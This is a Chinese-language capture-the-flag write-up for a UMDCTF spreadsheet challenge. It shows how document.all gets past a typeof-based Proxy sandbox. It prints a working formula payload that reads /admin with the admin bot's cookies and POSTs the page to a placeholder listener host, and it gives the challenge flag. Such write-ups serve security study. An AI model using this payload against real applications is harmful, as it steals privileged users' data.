# open-insight

## 题目简述

电子表格的公式引擎用 `new Function` 执行表达式，并通过 Proxy 暴露一个“过滤后的” `document`。过滤器把 `typeof` 为 `object` 或 `function` 的属性替换为 `undefined`，意图阻止访问 DOM。管理员 bot 会登录后打开用户提交的表格，而 flag 位于仅管理员可见的 `/admin`。

浏览器中的 `document.all` 是 HTML 规范保留的特殊对象：它是真实的 `HTMLAllCollection`，但 `typeof document.all` 特意返回 `"undefined"`。因此它会穿过过滤器。

## 解题过程

Proxy 只包装 `document` 本身，没有继续包装从属性取出的对象。页面导航栏存在稳定元素：

```html
<span id="current-user">
```

通过 `document.all["current-user"]` 取得原始元素后，可以沿：

```text
element.ownerDocument.defaultView
```

回到未过滤的真实 `window`。在单元格中植入：

```javascript
=(()=>{
  const w=document.all["current-user"].ownerDocument.defaultView;
  const x=new w.XMLHttpRequest();
  x.open("GET","/admin",false);
  x.send();
  w.fetch("http://YOUR-HOST:4444/",{
    method:"POST",
    body:x.responseText
  });
  return "";
})()
```

创建并保存工作簿后，把 sheet id 提交给 review bot。bot 以管理员身份登录并打开表格，公式在同源页面执行，XHR 因而携带管理员 cookie 读取 `/admin`。随后跨源 POST 把完整 HTML 发到监听端。

这里不需要读取跨源响应：默认文本 POST 属于可直接发出的简单请求，即使浏览器因 CORS 不允许脚本读取响应，攻击者服务器仍会收到请求正文。提取 HTML 中的 flag：

```text
UMDCTF{r0ll_y0ur_0wn_s4nit1zat1on}
```

## 方法总结

基于 `typeof` 的黑名单无法安全包装 DOM，`document.all` 的历史兼容特性正好绕过判断。更根本的问题是公式通过 `new Function` 在页面主 Realm 中执行。安全设计应使用无 DOM 权限的隔离执行环境和白名单表达式语法，而不是代理少数全局对象。
